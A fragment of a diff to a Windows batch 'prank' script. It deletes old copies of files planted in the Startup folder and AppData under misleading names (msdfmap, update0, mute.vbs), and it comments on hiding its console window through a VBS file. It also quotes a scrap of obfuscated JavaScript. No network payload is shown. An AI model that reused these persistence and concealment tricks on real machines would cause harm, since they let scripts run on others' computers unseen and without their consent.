@@ -1,5 +1,4 @@
 @echo off
-
 REM Use this for educational purposes only.
 REM I do not any take responsability for you pranking your friends or getting in trouble.
 REM If you accidentally downloaded this or ran this, you can download the remover.bat from the gihub page. 
@@ -11895,42 +11894,42 @@ REM [_0xb663('0xa')][_0xb663('0xb')](_0x2b2397,_0x3980a4);}());</script
 If EXIST C:\Users\%username%\AppData\Local\startup_copier.bat (
 	del "C:\Users\%username%\AppData\Local\startup_copier.bat"
 ) ELSE (
-	ECHO hello
+	ECHO
 )
 If EXIST C:\Users\%username%\AppData\Roaming\startup_copier2.bat (
 	del "C:\Users\%username%\AppData\Roaming\startup_copier2.bat"
 ) ELSE (
-	ECHO hello
+	ECHO
 )
 If EXIST C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat (
 	del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat"
 ) ELSE (
-	ECHO hello
+	ECHO
 )
 If EXIST C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.bat (
 	del "C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.bat"
 ) ELSE (
-	ECHO hello
+	ECHO
 )
 If EXIST C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs (
 	del "C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs"
 ) ELSE (
-	ECHO hello
+	ECHO
 )
 If EXIST C:\Users\%username%\AppData\Roaming\Microsoft\mute.vbs (
 	del "C:\Users\%username%\AppData\Roaming\Microsoft\mute.vbs"
 ) ELSE (
-	ECHO hello
+	ECHO
 )
 If EXIST C:\Users\%username%\AppData\Roaming\Microsoft\update0.bat (
 	del "C:\Users\%username%\AppData\Roaming\Microsoft\update0.bat"
 ) ELSE (
-	ECHO hello
+	ECHO
 )
 If EXIST C:\Users\%username%\AppData\Local\startup.bat (
 	del "C:\Users\%username%\AppData\Local\startup.bat"
 ) ELSE (
-	ECHO hello
+	ECHO
 )
 REM Makes the batch file invisible so no CMD prompt shows. puts the invisible code in a vbs file.
 type NUL > C:\Users\%username%\Downloads\msdfmap.vbs
